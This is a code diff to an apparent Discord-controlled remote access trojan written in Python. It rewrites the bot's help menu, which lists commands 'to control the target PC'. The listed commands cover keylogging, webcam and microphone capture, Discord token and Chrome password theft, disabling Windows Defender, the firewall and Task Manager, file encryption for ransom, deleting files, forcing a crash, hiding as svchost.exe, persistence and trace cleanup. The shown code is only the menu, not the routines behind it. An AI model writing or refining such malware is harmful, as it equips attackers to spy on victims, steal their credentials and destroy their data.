@@ -1430,21 +1430,130 @@ async def list_desktop_folder(ctx):
 
 @bot.command(name='help')
 async def help_cmd(ctx):
-    embed = discord.Embed(title="RAT Commands", color=discord.Color.purple())
-    embed.add_field(name="Info", value="`info`, `sysinfo`, `idletime`, `geolocate`", inline=False)
-    embed.add_field(name="Control", value="`lock`, `crash`, `shutdown`, `restart`, `critical`, `rootkit`", inline=False)
-    embed.add_field(name="Files", value="`cd`, `dir`, `listfiles`, `download`, `upload`, `delete`, `downloads`, `installed`", inline=False)
-    embed.add_field(name="File Browsing", value="`downloadsfolder`, `documentsfolder`, `picturesfolder`, `videosfolder`, `desktopfolder`", inline=False)
-    embed.add_field(name="Input", value="`click`, `press`, `screenshot`, `blockinput`, `unblockinput`, `shake`, `shakestop`", inline=False)
-    embed.add_field(name="Media", value="`webcampic`, `mic`, `camrec`, `voice`, `playpause`, `nexttrack`, `wallpaper`", inline=False)
-    embed.add_field(name="Audio", value="`mute`, `unmute`, `capslock`, `capslockon`, `capslockoff`", inline=False)
-    embed.add_field(name="Display", value="`fullscreenlock`, `fullscreenunlock`", inline=False)
-    embed.add_field(name="Destructive", value="`filescramble`, `filedestroy`, `fileransom`, `virus`, `msgbox`", inline=False)
-    embed.add_field(name="Security", value="`grabtokens`, `password`, `disabledefender`, `disablefirewall`, `disabletaskmgr`, `enabletaskmgr`", inline=False)
-    embed.add_field(name="Keylogger", value="`keylog start/stop/dump`, `keylogstart`, `keylogstop`, `keylogdump`, `keylogclear`, `keylogstatus`", inline=False)
-    embed.add_field(name="Process", value="`listprocess`, `prockill`, `listapps`, `open`, `close`", inline=False)
-    embed.add_field(name="Persistence", value="`persistence`, `killswitch`, `startup`", inline=False)
-    embed.add_field(name="Other", value="`cmd`, `website`, `clipboard`, `exit`", inline=False)
+    embed = discord.Embed(
+        title="Commands",
+        description="A list of commands you can run to control the target PC.",
+        color=discord.Color.purple()
+    )
+    
+    categories = {
+        "Config": [
+            f"**Prefix:** `{Config.PREFIX}`",
+            f"**Whitelisted:** <@{Config.WHITELISTED[0]}>",
+            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
+        ],
+        "System Info": [
+            "`info` - Get advanced system information",
+            "`sysinfo` - Alias for info",
+            "`idletime` - Check user idle time",
+            "`geolocate` - Get IP geolocation"
+        ],
+        "Destructive": [
+            "`lock` - Locks the PC",
+            "`crash` - Blue screens the PC (admin required)",
+            "`filescramble` - Renames all files randomly",
+            "`filedestroy` - Deletes all personal files",
+            "`fileransom` - Encrypts all files",
+            "`virus` - Displays fake virus messages",
+            "`delete` - Delete a file"
+        ],
+        "Messages & Alerts": [
+            "`voice [message]` - Text-to-speech message",
+            "`msgbox [message]` - Message box popup",
+            "`rickroll` - Opens Rickroll video"
+        ],
+        "Control & Commands": [
+            "`screenshot [name]` - Take screenshot",
+            "`open <app>` - Open an application",
+            "`close <app>` - Close an application",
+            "`listapps [limit]` - List running applications",
+            "`cmd [command]` - Run a CMD command",
+            "`website <url>` - Open a website"
+        ],
+        "Mouse & Keyboard": [
+            "`click [left|right|middle]` - Mouse click",
+            "`press <keys>` - Press keys (e.g. ctrl+c)",
+            "`blockinput` - Block keyboard/mouse (admin)",
+            "`unblockinput` - Unblock keyboard/mouse",
+            "`shake <seconds>` - Shake cursor (5-300s)",
+            "`shakestop` - Stop cursor shaking"
+        ],
+        "Power Control": [
+            "`shutdown [delay]` - Shutdown PC",
+            "`restart [delay]` - Restart PC",
+            "`critical` - Make process critical (admin)",
+            "`rootkit` - Hide process as svchost.exe (admin)"
+        ],
+        "Media & Audio": [
+            "`playpause` - Play/Pause media",
+            "`nexttrack` - Next track",
+            "`mute` - Mute system audio",
+            "`unmute` - Unmute system audio",
+            "`capslock` - Toggle caps lock",
+            "`capslockon` - Turn caps lock ON",
+            "`capslockoff` - Turn caps lock OFF"
+        ],
+        "Display": [
+            "`fullscreenlock` - Hide taskbar (fullscreen lock)",
+            "`fullscreenunlock` - Show taskbar",
+            "`wallpaper` - Change wallpaper (attach image)"
+        ],
+        "Files & Navigation": [
+            "`cd [path]` - Change current directory",
+            "`dir` - List current directory",
+            "`listfiles [directory]` - List files with details",
+            "`download <file>` - Download a file",
+            "`upload` - Upload a file (attach to command)",
+            "`downloads` - Show recent downloads",
+            "`installed` - List installed programs",
+            "`downloadsfolder` - List Downloads folder",
+            "`documentsfolder` - List Documents folder",
+            "`picturesfolder` - List Pictures folder",
+            "`videosfolder` - List Videos folder",
+            "`desktopfolder` - List Desktop folder"
+        ],
+        "Surveillance": [
+            "`webcampic` - Take webcam photo",
+            "`camrec <seconds>` - Record webcam video (5-300s)",
+            "`mic <seconds>` - Record microphone (5-60s)",
+            "`screenshot` - Take screenshot",
+            "`clipboard` - Get clipboard contents",
+            "`keylog start/stop/dump` - Keylogger control",
+            "`keylogstart` - Start keylogger",
+            "`keylogstop` - Stop keylogger",
+            "`keylogdump` - Dump keylogger logs",
+            "`keylogclear` - Clear keylogger logs",
+            "`keylogstatus` - Check keylogger status"
+        ],
+        "Security & Stealing": [
+            "`grabtokens` - Grab Discord tokens",
+            "`password` - Dump Chrome passwords",
+            "`disabledefender` - Disable Windows Defender (admin)",
+            "`disablefirewall` - Disable Windows Firewall (admin)",
+            "`disabletaskmgr` - Disable Task Manager",
+            "`enabletaskmgr` - Enable Task Manager"
+        ],
+        "Process Management": [
+            "`listprocess` - List all running processes",
+            "`prockill <name>` - Kill a process by name"
+        ],
+        "Persistence": [
+            "`persistence` - Add to startup",
+            "`startup add/remove` - Add/remove from startup",
+            "`killswitch` - Clean traces and exit"
+        ],
+        "Bot": [
+            "`exit` - Closes the RAT and exits"
+        ]
+    }
+    
+    for category, commands in categories.items():
+        embed.add_field(
+            name=category,
+            value="\n".join(commands),
+            inline=False
+        )
+    
     await ctx.send(embed=embed)
 
 @bot.command(name='startup')
